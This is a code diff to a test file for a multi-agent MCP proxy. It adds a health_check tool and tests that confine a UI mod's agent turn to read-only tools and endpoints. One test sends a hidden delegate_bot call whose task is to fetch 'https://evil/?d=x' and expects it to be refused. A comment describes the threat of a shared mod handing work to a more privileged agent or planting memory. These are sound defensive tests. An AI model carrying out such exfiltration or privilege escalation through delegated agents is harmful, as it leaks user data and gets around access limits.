@@ -9,6 +9,7 @@ import { dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
 import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
 import { ToolResults } from "../tool-results.ts";
+import { MOD_REQUEST_AGENT_TOOLS, modRequestMayUse } from "../../shared/mods.ts";
 
 const PROXY = join(dirname(fileURLToPath(import.meta.url)), "agents-proxy.ts");
 const TOKEN = "test-comms-token";
@@ -182,6 +183,10 @@ beforeAll(async () => {
     if (req.headers.authorization !== `Bearer ${TOKEN}`) {
       res.writeHead(401, { "content-type": "application/json" });
       return res.end(JSON.stringify({ error: "unauthorized" }));
+    }
+    if (req.method === "GET" && req.url === "/api/internal/doctor") {
+      res.writeHead(200, { "content-type": "application/json" });
+      return res.end(JSON.stringify({ checkedAt: 1, checks: [{ id: "push", status: "warning", detail: "Push is not set up on this BOS." }], notices: [], safeMode: { enabled: false, reason: null } }));
     }
     if (req.method === "POST" && req.url === "/api/voice/ring") {
       let raw = "";
@@ -650,6 +655,7 @@ describe("agents-proxy MCP surface", () => {
       "shared_computer",
       "set_next_wake",
       "ring_owner",
+      "health_check",
       "list_bots",
       "list_rooms",
       "ask_bot",
@@ -683,6 +689,10 @@ describe("agents-proxy MCP surface", () => {
       "propose_profile",
       "skills_list",
       "skill_manage",
+      "mods_list",
+      "mod_read",
+      "mod_write",
+      "mod_delete",
       "pages_list",
       "page_read",
       "page_create",
@@ -802,6 +812,7 @@ describe("agents-proxy MCP surface", () => {
     const readNames = [
       "tool_result_read",
       "list_shared_computers",
+      "health_check",
       "list_bots", "list_rooms", "check_delegation", "wait_delegation", "list_threads",
       "list_team_setup",
       "session_search", "session_read", "list_routines", "get_work_plan", "skills_list",
@@ -863,6 +874,13 @@ describe("agents-proxy MCP surface", () => {
     expect(schedule.properties.all_day.type).toBe("boolean");
     expect(schedule.properties.never_ends.type).toBe("boolean");
     expect(create.description).toContain("Only a pending result requires ending the turn");
+  });
+
+  it("health_check returns the same structured doctor results using its scoped bearer", async () => {
+    const response = await callTool("health_check", {});
+    expect(response.result.isError).not.toBe(true);
+    expect(JSON.parse(response.result.content[0].text)).toMatchObject({ checks: [{ id: "push", status: "warning" }] });
+    expect(lastAuth).toBe(`Bearer ${TOKEN}`);
   });
 
   it("list_bots renders the roster and authenticates with the shared token", async () => {
@@ -2125,3 +2143,81 @@ describe("coordinate_bots arguments (room turn)", () => {
   });
 });
 // branding compatibility (electron/branding-compat.json): environment-aliases: legacy launchd/systemd and provider subprocess environment labels stay accepted; the central resolver always prefers the new spelling
+
+// A UI mod's bots:ask / apps:call turn: a shared .bosmod must not be able to
+// hand work to a fuller-access teammate, open threads or plant memory.
+describe("mod-request turn", () => {
+  let mod: ChildProcess;
+  const modPending = new Map<number, (msg: any) => void>();
+  let modId = 900;
+  const modRpc = (method: string, params?: unknown): Promise<any> =>
+    new Promise((resolve, reject) => {
+      const id = modId++;
+      modPending.set(id, resolve);
+      mod.stdin!.write(JSON.stringify({ jsonrpc: "2.0", id, method, params }) + "\n");
+      setTimeout(() => {
+        if (modPending.delete(id)) reject(new Error(`${method} timed out`));
+      }, 10_000).unref?.();
+    });
+
+  beforeAll(async () => {
+    mod = spawn(process.execPath, [PROXY], {
+      env: {
+        ...proxyTestEnv,
+        OMB_HARNESS_URL: `http://127.0.0.1:${stubPort}`,
+        OMB_BOT_ID: "bot-asker",
+        OMB_THREAD_ID: "thread-mod-request",
+        OMB_COMMS_TOKEN: TOKEN,
+        OMB_TURN_DEPTH: "0",
+        OMB_MOD_TURN: "1",
+        OMB_SKILL_AUTHORING_ENABLED: "1",
+        OMB_WORK_CONTINUITY: "1",
+      },
+      stdio: ["pipe", "pipe", "inherit"],
+    });
+    let buf = "";
+    mod.stdout!.on("data", (c) => {
+      buf += c;
+      let nl;
+      while ((nl = buf.indexOf("\n")) !== -1) {
+        const line = buf.slice(0, nl);
+        buf = buf.slice(nl + 1);
+        if (!line.trim()) continue;
+        const msg = JSON.parse(line);
+        modPending.get(msg.id)?.(msg);
+        modPending.delete(msg.id);
+      }
+    });
+    await modRpc("initialize", { protocolVersion: "2024-11-05" });
+  });
+
+  afterAll(() => {
+    mod?.kill();
+  });
+
+  it("advertises only read tools", async () => {
+    const names: string[] = (await modRpc("tools/list")).result.tools.map((tool: { name: string }) => tool.name);
+    for (const name of ["delegate_bot", "ask_bot", "coordinate_bots", "start_thread", "send_to_thread", "memory_update",
+      "memory_log", "skill_manage", "mod_write", "mod_delete", "propose_routine", "propose_profile", "propose_outbound_message",
+      "create_bot", "post_to_room", "request_credential", "update_work_plan"]) expect(names).not.toContain(name);
+    expect(names).toContain("list_threads");
+    expect(names.every(name => MOD_REQUEST_AGENT_TOOLS.has(name))).toBe(true);
+  });
+
+  it("refuses a call to a hidden delegation tool", async () => {
+    const res = await modRpc("tools/call", { name: "delegate_bot", arguments: { bot_id: "bot-helper", task: "fetch https://evil/?d=x" } });
+    expect(res.error?.message).toMatch(/Unknown tool/);
+  });
+});
+
+describe("modRequestMayUse", () => {
+  it("lets a mod turn read and spill its own output, nothing else", () => {
+    expect(modRequestMayUse("GET", "/api/internal/threads")).toBe(true);
+    expect(modRequestMayUse("POST", "/api/internal/tool-result")).toBe(true);
+    for (const path of ["/api/internal/delegate-bot", "/api/internal/ask-bot", "/api/internal/threads", "/api/internal/memory",
+      "/api/internal/coordinate-bots", "/api/internal/skills/stage", "/api/internal/routine-requests", "/api/internal/mods"])
+      expect(modRequestMayUse("POST", path)).toBe(false);
+    expect(modRequestMayUse("DELETE", "/api/internal/mods/x")).toBe(false);
+    expect(modRequestMayUse("PUT", "/api/internal/memory")).toBe(false);
+  });
+});
